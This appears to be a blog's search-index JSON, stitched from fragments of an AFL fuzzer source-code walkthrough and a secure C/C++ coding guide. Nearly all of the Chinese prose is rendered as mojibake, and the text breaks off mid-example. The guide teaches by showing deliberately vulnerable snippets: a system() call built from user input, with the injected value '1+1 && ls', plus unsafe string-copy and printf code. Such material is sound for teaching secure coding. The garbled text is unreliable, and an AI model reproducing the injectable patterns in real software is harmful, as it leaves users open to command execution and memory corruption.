virgin_bitsï¼Œå±äºæ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬ç»“åˆæºç æ¥è§£æä¸€ä¸‹ï¼š /* Configure shared memory and virgin_bits. This is called at startup. */ EXP_ST void setup_shm(void) { u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); // å¦‚æœ in_bitmap ä¸ºç©ºï¼Œè°ƒç”¨ memset åˆå§‹åŒ–æ•°ç»„ virgin_bits[MAP_SIZE] çš„æ¯ä¸ªå…ƒç´ çš„å€¼ä¸º â€˜255â€™ã€‚ memset(virgin_tmout, 255, MAP_SIZE); // è°ƒç”¨ memset åˆå§‹åŒ–æ•°ç»„ virgin_tmout[MAP_SIZE] çš„æ¯ä¸ªå…ƒç´ çš„å€¼ä¸º â€˜255â€™ã€‚ memset(virgin_crash, 255, MAP_SIZE); // è°ƒç”¨ memset åˆå§‹åŒ–æ•°ç»„ virgin_crash[MAP_SIZE] çš„æ¯ä¸ªå…ƒç´ çš„å€¼ä¸º â€˜255â€™ã€‚ shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); // è°ƒç”¨ shmget å‡½æ•°åˆ†é…ä¸€å—å…±äº«å†…å­˜ï¼Œå¹¶å°†è¿”å›çš„å…±äº«å†…å­˜æ ‡è¯†ç¬¦ä¿å­˜åˆ° shm_id if (shm_id \u003c 0) PFATAL(\"shmget() failed\"); atexit(remove_shm); // æ³¨å†Œ atexit handler ä¸º remove_shm shm_str = alloc_printf(\"%d\", shm_id); // åˆ›å»ºå­—ç¬¦ä¸² shm_str /* If somebody is asking us to fuzz instrumented binaries in dumb mode, we don't want them to detect instrumentation, since we won't be sending fork server commands. This should be replaced with better auto-detection later on, perhaps? */ if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); // å¦‚æœä¸æ˜¯dumb_modeï¼Œè®¾ç½®ç¯å¢ƒå˜é‡ SHM_ENV_VAR çš„å€¼ä¸º shm_str ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); // è®¾ç½® trace_bits å¹¶åˆå§‹åŒ–ä¸º0 if (trace_bits == (void *)-1) PFATAL(\"shmat() failed\"); } è¿™é‡Œé€šè¿‡ trace_bits å’Œ virgin_bits ä¸¤ä¸ª bitmap æ¥åˆ†åˆ«è®°å½•å½“å‰çš„ tuple ä¿¡æ¯åŠæ•´ä½“ tuple ä¿¡æ¯ï¼Œå…¶ä¸­ trace_bits ä½äºå…±äº«å†…å­˜ä¸Šï¼Œä¾¿äºè¿›è¡Œè¿›ç¨‹é—´é€šä¿¡ã€‚é€šè¿‡ virgin_tmout å’Œ virgin_crash ä¸¤ä¸ª bitmap æ¥è®°å½• fuzz è¿‡ç¨‹ä¸­å‡ºç°çš„æ‰€æœ‰ç›®æ ‡ç¨‹åºè¶…æ—¶ä»¥åŠå´©æºƒçš„ tuple ä¿¡æ¯ã€‚ 1.9 setup_dirs_fds å‡½æ•° è¯¥å‡½æ•°ç”¨äºå‡†å¤‡è¾“å‡ºæ–‡ä»¶å¤¹å’Œæ–‡ä»¶æè¿°ç¬¦ï¼Œç»“åˆæºç è¿›è¡Œè§£æï¼š EXP_ST void setup_dirs_fds(void) { u8* tmp; s32 fd; ACTF(\"Setting up output directories...\"); if (sync_id \u0026\u0026 mkdir(sync_dir, 0700) \u0026\u0026 errno != EEXIST) PFATAL(\"Unable to create '%s'\", sync_dir); /* å¦‚æœsync_idï¼Œä¸”åˆ›å»ºsync_diræ–‡ä»¶å¤¹å¹¶è®¾ç½®æƒé™ä¸º0700ï¼Œå¦‚æœæŠ¥é”™å•errnoä¸æ˜¯ EEXIST ï¼ŒæŠ›å‡ºå¼‚å¸¸ */ if (mkdir(out_dir, 0700)) { // åˆ›å»ºout_dirï¼Œ æƒé™ä¸º0700 if (errno != EEXIST) PFATAL(\"Unable to create '%s'\", out_dir); maybe_delete_out_dir(); } else { if (in_place_resume) // åˆ›å»ºæˆåŠŸ FATAL(\"Resume attempted but old output directory not found\"); out_dir_fd = open(out_dir, O_RDONLY); // ä»¥åªè¯»æ¨¡å¼æ‰“å¼€ï¼Œè¿”å›fdï¼šout_dir_fd #ifndef __sun if (out_dir_fd \u003c 0 || flock(out_dir_fd, LOCK_EX | LOCK_NB)) PFATAL(\"Unable to flock() output directory.\"); #endif /* !__sun */ } /* Queue directory for any starting \u0026 discovered paths. */ tmp = alloc_printf(\"%s/queue\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); // åˆ›å»º out_dir/queue æ–‡ä»¶å¤¹ï¼Œæƒé™ä¸º0700 ck_free(tmp); /* Top-level directory for queue metadata used for session resume and related tasks. */ tmp = alloc_printf(\"%s/queue/.state/\", out_dir); // åˆ›å»º out_dir/queue/.state æ–‡ä»¶å¤¹ï¼Œç”¨äºä¿å­˜session resume å’Œç›¸å…³tasksçš„é˜Ÿåˆ—å…ƒæ•°æ®ã€‚ if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* Directory for flagging queue entries that went through deterministic fuzzing in the past. */ tmp = alloc_printf(\"%s/queue/.state/deterministic_done/\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* Directory with the auto-selected dictionary entries. */ tmp = alloc_printf(\"%s/queue/.state/auto_extras/\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* The set of paths currently deemed redund","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"å››ã€æ€»ç»“ åˆ†æå®Œæºç ï¼Œå¯ä»¥æ„Ÿå—åˆ°ï¼ŒAFLéµå¾ªçš„åŸºæœ¬åŸåˆ™æ˜¯ç®€å•æœ‰æ•ˆï¼Œæ²¡æœ‰è¿›è¡Œè¿‡å¤šçš„å¤æ‚çš„ä¼˜åŒ–ï¼Œèƒ½å¤Ÿé’ˆå¯¹fuzzé¢†åŸŸçš„ç—›ç‚¹ï¼Œå¯¹ç—‡ä¸‹è¯ï¼Œæ‹’ç»èŠ±é‡Œèƒ¡å“¨ï¼Œç»™å‡ºåˆ‡å®å¯è¡Œçš„è§£å†³æ–¹æ¡ˆï¼Œåœ¨æ¼æ´æŒ–æ˜é¢†åŸŸçš„æ„ä¹‰çš„ç¡®éåŒå‡¡å“ã€‚åæœŸçš„å¾ˆå¤šå…ˆè¿›çš„fuzzå·¥å…·åŸºæœ¬æ²¿ç”¨äº†AFLçš„æ€è·¯ï¼Œç”šè‡³ç›®å‰ä¸ºæ­¢å·²åŸºæœ¬å›´ç»•AFLå»ºç«‹äº†â€œç”Ÿæ€åœˆâ€ï¼Œæ¶‰åŠåˆ°å¤šä¸ªå¹³å°ã€å¤šç§æ¼æ´æŒ–æ˜å¯¹è±¡ï¼Œå¯¹äºå®‰å…¨ç ”ç©¶å‘˜æ¥è¯´å®å±åˆ©å™¨ï¼Œå€¼å¾—ä»äº‹fuzzç›¸å…³å·¥ä½œçš„ç ”ç©¶å‘˜ä¸‹è¶³åŠŸå¤«å»ä½“ä¼šAFLçš„ç²¾é«“æ‰€åœ¨ã€‚ è€ƒè™‘åˆ°ç¯‡å¹…é™åˆ¶ï¼Œæˆ‘ä»¬æ²¡æœ‰å¯¹AFLä¸­çš„å˜å¼‚ç­–ç•¥è¿›è¡Œæºç è¯´æ˜ï¼Œå®å±é—æ†¾ã€‚å¦‚æœæœ‰æœºä¼šï¼Œå°†æ–°å¼€æ–‡ç« è¯¦ç»†ä»‹ç»AFLçš„å˜å¼‚ç­–ç•¥å’Œæºç åˆ†æã€‚ ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:6:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"äº”ã€å‚è€ƒæ–‡çŒ® http://lcamtuf.coredump.cx/afl/ https://eternalsakura13.com/2020/08/23/afl/ https://bbs.pediy.com/thread-265936.htm https://bbs.pediy.com/thread-249912.htm#msg_header_h3_3 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:7:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Development"],"content":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— C/C++ç¯‡","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"æ”¶é›†äºgithubï¼Œé€šç”¨å®‰å…¨ç¼–ç æŒ‡å—ç³»åˆ—ç¬¬ä¸€ç¯‡ï¼šC/C++ï¼Œæ€»ç»“æ¦‚è¿°åœ¨C/C ++ç¼–ç è¿‡ç¨‹ä¸­å¸¸è§çš„å®‰å…¨é—®é¢˜å’Œåº”è¯¥é‡‡å–çš„å®‰å…¨ç¼–ç æ ¼å¼ã€‚ ç›®å½• 1 é€šç”¨å®‰å…¨æŒ‡å— I. C/C++ä½¿ç”¨é”™è¯¯ 1.1 ä¸å¾—ç›´æ¥ä½¿ç”¨æ— é•¿åº¦é™åˆ¶çš„å­—ç¬¦æ‹·è´å‡½æ•° 1.2 åˆ›å»ºè¿›ç¨‹ç±»çš„å‡½æ•°çš„å®‰å…¨è§„èŒƒ 1.3 å°½é‡å‡å°‘ä½¿ç”¨ _alloca å’Œå¯å˜é•¿åº¦æ•°ç»„ 1.4 printfç³»åˆ—å‚æ•°å¿…é¡»å¯¹åº” 1.5 é˜²æ­¢æ³„éœ²æŒ‡é’ˆï¼ˆåŒ…æ‹¬%pï¼‰çš„å€¼ 1.6 ä¸åº”å½“æŠŠç”¨æˆ·å¯ä¿®æ”¹çš„å­—ç¬¦ä¸²ä½œä¸ºprintfç³»åˆ—å‡½æ•°çš„â€œformatâ€å‚æ•° 1.7 å¯¹æ•°ç»„deleteæ—¶éœ€è¦ä½¿ç”¨delete[] 1.8 æ³¨æ„éšå¼ç¬¦å·è½¬æ¢ 1.9 æ³¨æ„å…«è¿›åˆ¶é—®é¢˜ II. ä¸æ¨èçš„ç¼–ç¨‹ä¹ æƒ¯ 2.1 switchä¸­åº”æœ‰default 2.2 ä¸åº”å½“åœ¨Debugæˆ–é”™è¯¯ä¿¡æ¯ä¸­æä¾›è¿‡å¤šå†…å®¹ 2.3 ä¸åº”è¯¥åœ¨å®¢æˆ·ç«¯ä»£ç ä¸­ç¡¬ç¼–ç å¯¹ç§°åŠ å¯†ç§˜é’¥ 2.4 è¿”å›æ ˆä¸Šå˜é‡çš„åœ°å€ 2.5 æœ‰é€»è¾‘è”ç³»çš„æ•°ç»„å¿…é¡»ä»”ç»†æ£€æŸ¥ 2.6 é¿å…å‡½æ•°çš„å£°æ˜å’Œå®ç°ä¸åŒ 2.7 æ£€æŸ¥å¤åˆ¶ç²˜è´´çš„é‡å¤ä»£ç  2.8 å·¦å³ä¸€è‡´çš„é‡å¤åˆ¤æ–­/æ°¸è¿œä¸ºçœŸæˆ–å‡çš„åˆ¤æ–­ 2.9 å‡½æ•°æ¯ä¸ªåˆ†æ”¯éƒ½åº”æœ‰è¿”å›å€¼ 2.10 ä¸å¾—ä½¿ç”¨æ ˆä¸Šæœªåˆå§‹åŒ–çš„å˜é‡ 2.11 ä¸å¾—ç›´æ¥ä½¿ç”¨åˆšåˆ†é…çš„æœªåˆå§‹åŒ–çš„å†…å­˜ï¼ˆå¦‚reallocï¼‰ 2.12 æ ¡éªŒå†…å­˜ç›¸å…³å‡½æ•°çš„è¿”å›å€¼ 2.13 ä¸è¦åœ¨ifé‡Œé¢èµ‹å€¼ 2.14 ç¡®è®¤ifé‡Œé¢çš„æŒ‰ä½æ“ä½œ III. å¤šçº¿ç¨‹ 3.1 å˜é‡åº”ç¡®ä¿çº¿ç¨‹å®‰å…¨æ€§ 3.2 æ³¨æ„signal handlerå¯¼è‡´çš„æ¡ä»¶ç«äº‰ 3.3 æ³¨æ„Time-of-check Time-of-useæ¡ä»¶ç«äº‰ IV. åŠ å¯†è§£å¯† 4.1 ä¸å¾—æ˜æ–‡å­˜å‚¨ç”¨æˆ·å¯†ç ç­‰æ•æ„Ÿæ•°æ® 4.2 å†…å­˜ä¸­çš„ç”¨æˆ·å¯†ç ç­‰æ•æ„Ÿæ•°æ®åº”è¯¥å®‰å…¨æŠ¹é™¤ 4.3 rand() ç±»å‡½æ•°åº”æ­£ç¡®åˆå§‹åŒ– 4.4 åœ¨éœ€è¦é«˜å¼ºåº¦å®‰å…¨åŠ å¯†æ—¶ä¸åº”ä½¿ç”¨å¼±PRNGå‡½æ•° 4.5 è‡ªå·±å®ç°çš„randèŒƒå›´ä¸åº”è¿‡å° V. æ–‡ä»¶æ“ä½œ 5.1 é¿å…è·¯å¾„ç©¿è¶Šé—®é¢˜ 5.2 é¿å…ç›¸å¯¹è·¯å¾„å¯¼è‡´çš„å®‰å…¨é—®é¢˜ 5.3 æ–‡ä»¶æƒé™æ§åˆ¶ â…¥. æ–‡ä»¶æ“ä½œ 6.1 é˜²æ­¢å„ç§è¶Šç•Œå†™ 6.2 é˜²æ­¢ä»»æ„åœ°å€å†™ â…¦. æ–‡ä»¶æ“ä½œ 7.1 é˜²æ­¢æ•´æ•°æº¢å‡º 7.2 é˜²æ­¢Off-By-One 7.3 é¿å…å¤§å°ç«¯é”™è¯¯ 7.4 æ£€æŸ¥é™¤ä»¥é›¶å¼‚å¸¸ 7.5 é˜²æ­¢æ•°å­—ç±»å‹çš„é”™è¯¯å¼ºè½¬ 7.6 æ¯”è¾ƒæ•°æ®å¤§å°æ—¶åŠ ä¸Šæœ€å°/æœ€å¤§å€¼çš„æ ¡éªŒ â…§. æ–‡ä»¶æ“ä½œ 8.1 æ£€æŸ¥åœ¨pointerä¸Šä½¿ç”¨sizeof 8.2 æ£€æŸ¥ç›´æ¥å°†æ•°ç»„å’Œ0æ¯”è¾ƒçš„ä»£ç  8.3 ä¸åº”å½“å‘æŒ‡é’ˆèµ‹äºˆå†™æ­»çš„åœ°å€ 8.4 æ£€æŸ¥ç©ºæŒ‡é’ˆ 8.5 é‡Šæ”¾å®Œåç½®ç©ºæŒ‡é’ˆ 8.6 é˜²æ­¢é”™è¯¯çš„ç±»å‹è½¬æ¢ 8.7 æ™ºèƒ½æŒ‡é’ˆä½¿ç”¨å®‰å…¨ ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:0:0","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"é€šç”¨å®‰å…¨æŒ‡å— ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/:1:0","tags":["Coding","C/C++"],"title":"é€šç”¨å®‰å…¨ç¼–ç æŒ‡å— -- C/C++ ç¯‡","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c-/"},{"categories":["Development"],"content":"1 C/C++ ä½¿ç”¨é”™è¯¯ 1.1 ã€å¿…é¡»ã€‘ä¸å¾—ç›´æ¥ä½¿ç”¨æ— é•¿åº¦é™åˆ¶çš„å­—ç¬¦æ‹·è´å‡½æ•° ä¸åº”ç›´æ¥ä½¿ç”¨legacyçš„å­—ç¬¦ä¸²æ‹·è´ã€è¾“å…¥å‡½æ•°ï¼Œå¦‚strcpyã€strcatã€sprintfã€wcscpyã€mbscpyç­‰ï¼Œè¿™äº›å‡½æ•°çš„ç‰¹å¾æ˜¯ï¼šå¯ä»¥è¾“å‡ºä¸€é•¿ä¸²å­—ç¬¦ä¸²ï¼Œè€Œä¸é™åˆ¶é•¿åº¦ã€‚å¦‚æœç¯å¢ƒå…è®¸ï¼Œåº”å½“ä½¿ç”¨å…¶_så®‰å…¨ç‰ˆæœ¬æ›¿ä»£ï¼Œæˆ–è€…ä½¿ç”¨nç‰ˆæœ¬å‡½æ•°ï¼ˆå¦‚ï¼šsnprintfï¼Œvsnprintfï¼‰ã€‚ è‹¥ä½¿ç”¨å½¢å¦‚sscanfä¹‹ç±»çš„å‡½æ•°æ—¶ï¼Œåœ¨å¤„ç†å­—ç¬¦ä¸²è¾“å…¥æ—¶åº”å½“é€šè¿‡%10sè¿™æ ·çš„æ–¹å¼æ¥ä¸¥æ ¼é™åˆ¶å­—ç¬¦ä¸²é•¿åº¦ï¼ŒåŒæ—¶ç¡®ä¿å­—ç¬¦ä¸²æœ«å°¾æœ‰\\0ã€‚å¦‚æœç¯å¢ƒå…è®¸ï¼Œåº”å½“ä½¿ç”¨_så®‰å…¨ç‰ˆæœ¬ã€‚ ä½†æ˜¯æ³¨æ„ï¼Œè™½ç„¶MSVC 2015æ—¶é»˜è®¤å¼•å…¥ç»“å°¾ä¸º0ç‰ˆæœ¬çš„snprintfï¼ˆè¡Œä¸ºç­‰åŒäºC99å®šä¹‰çš„snprintfï¼‰ã€‚ä½†æ›´æ—©æœŸçš„ç‰ˆæœ¬ä¸­ï¼ŒMSVCçš„snprintfå¯èƒ½æ˜¯_snprintfçš„å®ã€‚è€Œ_snprintfæ˜¯ä¸ä¿è¯\\0ç»“å°¾çš„ï¼ˆè§æœ¬èŠ‚ååŠéƒ¨åˆ†ï¼‰ã€‚ ï¼ˆMSVCï¼‰ Beginning with the UCRT in Visual Studio 2015 and Windows 10, snprintf is no longer identical to _snprintf. The snprintf function behavior is now C99 standard compliant. ä»Visual Studio 2015å’ŒWindows 10ä¸­çš„UCRTå¼€å§‹ï¼Œsnprintfä¸å†ä¸_snprintfç›¸åŒã€‚snprintfå‡½æ•°è¡Œä¸ºç°åœ¨ç¬¦åˆC99æ ‡å‡†ã€‚ è¯·å‚è€ƒï¼šhttps://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/snprintf-snprintf-snprintf-l-snwprintf-snwprintf-l?redirectedfrom=MSDN\u0026view=vs-2019 å› æ­¤ï¼Œåœ¨ä½¿ç”¨nç³»åˆ—æ‹·è´å‡½æ•°æ—¶ï¼Œè¦ç¡®ä¿æ­£ç¡®è®¡ç®—ç¼“å†²åŒºé•¿åº¦ï¼ŒåŒæ—¶ï¼Œå¦‚æœä½ ä¸ç¡®å®šæ˜¯å¦ä»£ç åœ¨å„ä¸ªç¼–è¯‘å™¨ä¸‹éƒ½èƒ½ç¡®ä¿æœ«å°¾æœ‰0æ—¶ï¼Œå»ºè®®å¯ä»¥é€‚å½“å¢åŠ 1å­—èŠ‚è¾“å…¥ç¼“å†²åŒºï¼Œå¹¶å°†å…¶ç½®ä¸º\\0ï¼Œä»¥ä¿è¯è¾“å‡ºçš„å­—ç¬¦ä¸²ç»“å°¾ä¸€å®šæœ‰\\0ã€‚ // Good char buf[101] = {0}; snprintf(buf, sizeof(buf) - 1, \"foobar ...\", ...); ä¸€äº›éœ€è¦æ³¨æ„çš„å‡½æ•°ï¼Œä¾‹å¦‚strncpyå’Œ_snprintfæ˜¯ä¸å®‰å…¨çš„ã€‚ strncpyä¸åº”å½“è¢«è§†ä¸ºstrcpyçš„nç³»åˆ—å‡½æ•°ï¼Œå®ƒåªæ˜¯æ°å·§ä¸å…¶ä»–nç³»åˆ—å‡½æ•°åå­—å¾ˆåƒè€Œå·²ã€‚strncpyåœ¨å¤åˆ¶æ—¶ï¼Œå¦‚æœå¤åˆ¶çš„é•¿åº¦è¶…è¿‡nï¼Œä¸ä¼šåœ¨ç»“å°¾è¡¥\\0ã€‚ åŒæ ·ï¼ŒMSVC _snprintfç³»åˆ—å‡½æ•°åœ¨è¶…è¿‡æˆ–ç­‰äºnæ—¶ä¹Ÿä¸ä¼šä»¥0ç»“å°¾ã€‚å¦‚æœåç»­ä½¿ç”¨é0ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå¯èƒ½æ³„éœ²ç›¸é‚»çš„å†…å®¹æˆ–è€…å¯¼è‡´ç¨‹åºå´©æºƒã€‚ // Bad char a[4] = {0}; _snprintf(a, 4, \"%s\", \"AAAA\"); foo = strlen(a); ä¸Šè¿°ä»£ç åœ¨MSVCä¸­æ‰§è¡Œåï¼Œ a[4] == â€˜Aâ€™ï¼Œå› æ­¤å­—ç¬¦ä¸²æœªä»¥0ç»“å°¾ã€‚açš„å†…å®¹æ˜¯\"AAAA\"ï¼Œè°ƒç”¨strlen(a)åˆ™ä¼šè¶Šç•Œè®¿é—®ã€‚å› æ­¤ï¼Œæ­£ç¡®çš„æ“ä½œä¸¾ä¾‹å¦‚ä¸‹ï¼š // Good char a[4] = {0}; _snprintf(a, sizeof(a), \"%s\", \"AAAA\"); a[sizeof(a) - 1] = '\\0'; foo = strlen(a); åœ¨ C++ ä¸­ï¼Œå¼ºçƒˆå»ºè®®ç”¨ stringã€vector ç­‰æ›´é«˜å°è£…å±‚æ¬¡çš„åŸºç¡€ç»„ä»¶ä»£æ›¿åŸå§‹æŒ‡é’ˆå’ŒåŠ¨æ€æ•°ç»„ï¼Œå¯¹æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå®‰å…¨æ€§éƒ½æœ‰å¾ˆå¤§çš„å¸®åŠ©ã€‚ å…³è”æ¼æ´: ä¸­é£é™©-ä¿¡æ¯æ³„éœ² ä½é£é™©-æ‹’ç»æœåŠ¡ é«˜é£é™©-ç¼“å†²åŒºæº¢å‡º 1.2 ã€å¿…é¡»ã€‘åˆ›å»ºè¿›ç¨‹ç±»çš„å‡½æ•°çš„å®‰å…¨è§„èŒƒ systemã€WinExecã€CreateProcessã€ShellExecuteç­‰å¯åŠ¨è¿›ç¨‹ç±»çš„å‡½æ•°ï¼Œéœ€è¦ä¸¥æ ¼æ£€æŸ¥å…¶å‚æ•°ã€‚ å¯åŠ¨è¿›ç¨‹éœ€è¦åŠ ä¸ŠåŒå¼•å·ï¼Œé”™è¯¯ä¾‹å­ï¼š // Bad WinExec(\"D:\\\\program files\\\\my folder\\\\foobar.exe\", SW_SHOW); å½“å­˜åœ¨D:\\program files\\my.exeçš„æ—¶å€™ï¼Œmy.exeä¼šè¢«å¯åŠ¨ã€‚è€Œfoobar.exeä¸ä¼šå¯åŠ¨ã€‚ // Good WinExec(\"\\\"D:\\\\program files\\\\my folder\\\\foobar.exe\\\"\", SW_SHOW); å¦å¤–ï¼Œå¦‚æœå¯åŠ¨æ—¶ä»ç”¨æˆ·è¾“å…¥ã€ç¯å¢ƒå˜é‡è¯»å–ç»„åˆå‘½ä»¤è¡Œæ—¶ï¼Œè¿˜éœ€è¦æ³¨æ„æ˜¯å¦å¯èƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚ // Bad std::string cmdline = \"calc \"; cmdline += user_input; system(cmdline.c_str()); æ¯”å¦‚ï¼Œå½“ç”¨æˆ·è¾“å…¥1+1 \u0026\u0026 lsæ—¶ï¼Œæ‰§è¡Œçš„å®é™…ä¸Šæ˜¯calc 1+1å’Œls ä¸¤ä¸ªå‘½ä»¤ï¼Œå¯¼è‡´å‘½ä»¤æ³¨å…¥ã€‚ éœ€è¦æ£€æŸ¥ç”¨æˆ·è¾“å…¥æ˜¯å¦å«æœ‰éæ³•æ•°æ®ã€‚ // Good std::string cmdline = \"ls \"; cmdline += user_input; if(cmdline.find_first_not_of(\"1234567890.+-*/e \") == std::string::npos) system(cmdline.c_str()); else warning(...); å…³è”æ¼æ´: é«˜é£é™©-ä»£ç æ‰§è¡Œ é«˜é£é™©-æƒé™æå‡ 1.3 ã€å¿…é¡»ã€‘å°½é‡å‡å°‘ä½¿ç”¨ _alloca å’Œå¯å˜é•¿åº¦æ•°ç»„ _alloca å’Œå¯å˜é•¿åº¦æ•°ç»„ä½¿ç”¨çš„å†…å­˜é‡åœ¨ç¼–è¯‘æœŸé—´ä¸å¯çŸ¥ã€‚å°¤å…¶æ˜¯åœ¨å¾ªç¯ä¸­ä½¿ç”¨æ—¶ï¼Œæ ¹æ®ç¼–è¯‘å™¨çš„å®ç°ä¸åŒï¼Œå¯èƒ½ä¼šå¯¼è‡´ï¼šï¼ˆ1ï¼‰æ ˆæº¢å‡ºï¼Œå³æ‹’ç»æœåŠ¡ï¼› ï¼ˆ2ï¼‰ç¼ºå°‘æ ˆå†…å­˜æµ‹è¯•çš„ç¼–è¯‘å™¨å®ç°å¯èƒ½å¯¼è‡´ç”³è¯·åˆ°éæ ˆå†…å­˜ï¼Œå¹¶å¯¼è‡´å†…å­˜æŸåã€‚è¿™åœ¨æ ˆæ¯”è¾ƒå°çš„ç¨‹åºä¸Šï¼Œä¾‹å¦‚IoTè®¾å¤‡å›ºä»¶ä¸Šå½±å“å°¤ä¸ºå¤§ã€‚å¯¹äº C++ï¼Œå¯å˜é•¿åº¦æ•°ç»„ä¹Ÿå±äºéæ ‡å‡†æ‰©å±•ï¼Œåœ¨ä»£ç è§„èŒƒä¸­ç¦æ­¢ä½¿ç”¨ã€‚ é”™è¯¯ç¤ºä¾‹ï¼š // Bad for (int i = 0; i \u003c 100000; i++) { char* foo = (char *)_alloca(0x10000); ..do something with foo ..; } void Foo(int size) { char msg[size]; // ä¸å¯æ§çš„æ ˆæº¢å‡ºé£é™©ï¼ } æ­£ç¡®ç¤ºä¾‹ï¼š // Good // æ”¹ç”¨åŠ¨æ€åˆ†é…çš„å †å†…å­˜ for (int i = 0; i \u003c 100000; i++) { char * foo = (char *)malloc(0x10000); ..do something with foo ..; if (foo_is_no_longer_needed) { free(foo); foo = NULL; } } void Foo(int size) { std::string msg(size, '\\0'); // C++ char* msg = malloc(size); // C } å…³è”æ¼æ´: ä½é£é™©-æ‹’ç»æœåŠ¡ é«˜é£é™©-å†…å­˜ç ´å 1.4 ã€å¿…é¡»ã€‘printfç³»åˆ—å‚æ•°å¿…é¡»å¯¹åº” æ‰€æœ‰printfç³»åˆ—å‡½æ•°ï¼Œå¦‚sprintfï¼Œsnprintfï¼Œvprintfç­‰å¿…é¡»å¯¹åº”æ§åˆ¶ç¬¦å·å’Œå‚æ•°ã€‚ é”™è¯¯ç¤ºä¾‹ï¼š // Bad const int buf_size = 1000; char buffer_send_to_remote_client[buf_size] = {0}; snprintf(buffer_send_to_remote_client, buf_size, \"%d: %p\", id, some_string); // %p åº”ä¸º %s buffer_send_to_remote_client[buf_size - 1] = '\\0'; send_to_remote(buffer_send_to_remote_client); æ­£ç¡®ç¤ºä¾‹ï¼š // Good const int buf_size = 1000; char buffer_send_to_remote_client[buf_size] = {0}; snprintf(buffer_send_to_remote_client, buf_size, \"%d: %s\", id, some_string); buffer_send_to_remote_client[buf_size - 1] = '\\0'; send_to_remote(buffer_send_to_remote_client); å‰è€…å¯èƒ½ä¼šè®©clientçš„æ”»å‡»è€…è·å–éƒ¨åˆ†æœåŠ¡å™¨çš„åŸå§‹æŒ‡é’ˆåœ°å€ï¼Œå¯ä»¥ç”¨äºç ´åASLRä¿æŠ¤ã€‚ å…³è”æ¼æ´: ä¸­é£é™©-ä¿¡æ¯æ³„éœ² 1.5 ã€å¿…é¡»ã€‘é˜²æ­¢æ³„éœ²æŒ‡é’ˆï¼ˆåŒ…æ‹¬%pï¼‰çš„å€¼ æ‰€æœ‰printfç³»åˆ—å‡½æ•°ï¼Œè¦é˜²æ­¢æ ¼å¼åŒ–å®Œçš„å­—ç¬¦ä¸²æ³„éœ²ç¨‹åºå¸ƒå±€ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå°†å¸¦æœ‰%pçš„å­—ç¬¦ä¸²æ³„éœ²ç»™ç¨‹åºï¼Œåˆ™å¯èƒ½ä¼šç ´åASLRçš„é˜²æŠ¤æ•ˆæœã€‚ä½¿å¾—æ”»å‡»è€…æ›´å®¹æ˜“æ”»ç ´ç¨‹åºã€‚ %pçš„å€¼åªåº”å½“åœ¨ç¨‹åºå†…ä½¿ç”¨ï¼Œè€Œä¸åº”å½“è¾“å‡ºåˆ°å¤–éƒ¨æˆ–è¢«å¤–éƒ¨ä»¥æŸç§æ–¹å¼è·å–ã€‚ é”™è¯¯ç¤ºä¾‹ï¼š // Bad // å¦‚æœè¿™æ˜¯æš´éœ²ç»™å®¢æˆ·çš„ä¸€ä¸ªAPIï¼š uint64_t GetUniqueObjectId(const Foo* pobject) { return (uint64_t)pobject; } æ­£ç¡®ç¤ºä¾‹ï¼š // Good uint64_t g_object_id = 0; void Foo::Foo() { this-\u003eobject_id_ = g_object_id++; } // å¦‚æœè¿™æ˜¯æš´éœ²ç»™å®¢æˆ·çš„ä¸€ä¸ªAPIï¼š uint64_t 